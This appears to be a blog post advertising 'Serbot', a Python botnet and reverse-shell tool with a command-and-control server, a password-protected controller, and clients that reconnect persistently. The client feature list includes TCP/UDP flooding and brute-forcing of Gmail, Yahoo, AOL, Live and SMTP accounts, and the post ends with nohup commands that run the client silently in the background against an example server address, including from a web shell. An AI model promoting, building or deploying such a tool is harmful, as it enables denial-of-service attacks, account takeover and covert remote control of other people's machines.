Hello everyone,

![alt tag](https://dotcppfile.files.wordpress.com/2014/11/rsz_1rsz_serbot.png)

Serbot is hot, keep reading Lol.

So, lets just get to the point, I’ve showed you [Awrs](http://dotcppfile.wordpress.com/2014/11/03/awrs-advanced-clientserver-windowslinux-python-reverse-shell/) and what it’s capable of, considered as one of the best Reverse Shells I’ve decided to Update Awrs and create Serbot and no, it’s not what you think Lol.

Serbot is an advanced version of Awrs where the Server can be managed by 1 Controller at a time.
######Example:
Server hosted on 15.48.158.15 and accepts up to 100 clients through port 1567, accepts 1 Controller at a time through port 2357 and the Controller’s functions are protected with a password: “IAmAPassword”
Client 1 hosted on 86.58.157.25 connected to 15.48.158.15:1567
Client 2 hosted on 78.459.17.35 connected to 15.48.158.15:1567
Controller running on my own computer connected to the Server on 15.48.158.15:2357 using the valid password “IAmAPassword”

In Serbot’s case, the Server also plays the role of a Bridge between the Clients and the Controller. This should sum things up. There’s a lot of benefits out of this now that’s for sure. A team of Researches or Hacktivists can now interact with all their clients using their Controllers, they don’t have to worry about portforwading, reverse shell’s stability and speed etc and they’re all sharing everything they have control on in one place.

In Serbot, everything was dealt with, your Server will never crash nor will your Clients no matter what, check the features list below for more info:

#####Server:
1. Linux/Windows Version.
1. Multi Handler. Can handle multiple connections all at once.
1. Bridge. Plays also the roll of a Bridge between the Clients and the Controller.
1. The Controller’s connection requires a plain text password, it’s not the best but it’s more than enough when it comes to keeping “l337 hax0rz b0t tak30v3r” away.
1. Accepts only 1 Controller at a time.
1. Kicks the Controller after 10 mins. This was added just in case someone forgot his Controller on which won’t allow other controllers to connect (since the Server only accepts 1 controller at a time).
1. Uses a very small amount of CPU and RAM when running.
1. Fast and Stable.

#####Client:
1. Linux/Windows Version.
1. TCP Flood.
1. UDP Flood.
1. Gmail Bruteforcer (Workaround gmail's SMTP login)
1. Live Bruteforcer
1. Yahoo Bruteforcer
1. AOL Bruteforce
1. Custome SMTP Bruteforcer
(if found, the password will be saved in "password.txt" client-side)
1. You’ll never lose your shell. (No Output, Wrong, Interactive and Infinite commands won’t kill your shell)
1. Never closes and is always trying to connect to the Server.
1. Can handle any command properly, such as the cd command.
1. Always gets back a response. (Command Output or Simple Client response)
1. Uses a very small amount of CPU and RAM when running.
1. Fast and Stable.

#####Controller:
1. Linux/Windows Version.
1. Handles all commands perfectly.
1. Handles any stupidity (KeyboardInterrupts, empty commands, etc) perfectly.
1. Uses a very small amount of CPU and RAM when running.
1. Easy user interface.
1. Fast and Stable.

This list isn’t enough but that’s all that I can think of right now. If you want to know how stable Serbot is then you have to try and code something similar to it Lol because then you’ll know that it handles everything you’re facing when it comes to bugs, errors, commands etc…

You simply have to remove the “#!/usr/bin/env python2″ at the top of every script to get this up and running on windows.

#####Extra:
If you’re trying to activate the Client threw ssl, shell or web shell then you have to run the Client.py in another process in the background or else your shell will dive into an endless loop and the best way to do that in Linux would be using nohup.

######Example:
nohup python client.py 15.48.158.15 1567 > /dev/null &

nohup python client.py 15.48.158.15 1567 > /dev/null 2>&1 &

Greetings to Team Prophetic, Chaoshackerz and all the followers of https://dotcppfile.wordpress.com/,
That’s all,
dotcppfile.
